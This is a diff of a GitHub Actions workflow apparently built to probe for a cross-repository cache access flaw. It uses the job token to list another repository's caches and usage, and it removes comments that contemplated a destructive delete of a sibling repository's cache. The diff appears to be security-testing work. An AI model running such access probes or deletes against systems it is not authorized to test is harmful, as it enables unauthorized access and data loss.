@@ -1,5 +1,6 @@
 name: cache-idor-focused
-on: workflow_dispatch
+on:
+  workflow_dispatch:
 permissions:
   contents: read
   actions: read
@@ -7,7 +8,8 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - env:
+      - name: Cross-repo cache list probe
+        env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           set -euo pipefail
@@ -18,17 +20,11 @@ jobs:
               -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
               "https://api.github.com/repos/$repo/actions/caches")
             echo "HTTP $code"
-            python3 -c 'import json;d=json.load(open("/tmp/out.json"));
-print("keys",list(d)[:8] if isinstance(d,dict) else type(d));
-print("total",d.get("total_count") if isinstance(d,dict) else None);
-print("names",[c.get("key") for c in (d.get("actions_caches") or [])[:5]] if isinstance(d,dict) else d)'
+            python3 -c 'import json;d=json.load(open("/tmp/out.json")); print(d if not isinstance(d,dict) else {"total":d.get("total_count"),"msg":d.get("message"),"keys":[c.get("key") for c in (d.get("actions_caches") or [])[:8]]})'
           done
-          # If we can see sibling cache keys, try to restore via actions/cache with wrong scope - won't work via action easily
-          # Try caches API delete on sibling (destructive write)
-          echo "==== try get cache usage ===="
           for repo in sujit-jaunjal/app-authz-public sujit-jaunjal/app-authz-private; do
             code=$(curl -sS -o /tmp/u.json -w "%{http_code}" \
               -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
               "https://api.github.com/repos/$repo/actions/cache/usage")
-            echo "usage $repo HTTP $code $(head -c 200 /tmp/u.json)"
+            echo "usage $repo HTTP $code $(head -c 220 /tmp/u.json)"
           done
